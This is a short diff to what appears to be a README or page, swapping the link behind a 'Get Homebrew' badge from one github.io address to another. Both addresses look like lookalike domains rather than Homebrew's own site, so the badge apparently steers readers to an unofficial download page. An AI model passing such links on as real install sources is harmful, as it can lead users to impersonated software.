@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/homebrew">
+  <a href="https://osx-quick-app.github.io/.github/homebrew">
     <img src="https://img.shields.io/badge/Get%20Homebrew-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Homebrew">
   </a>
 </p>
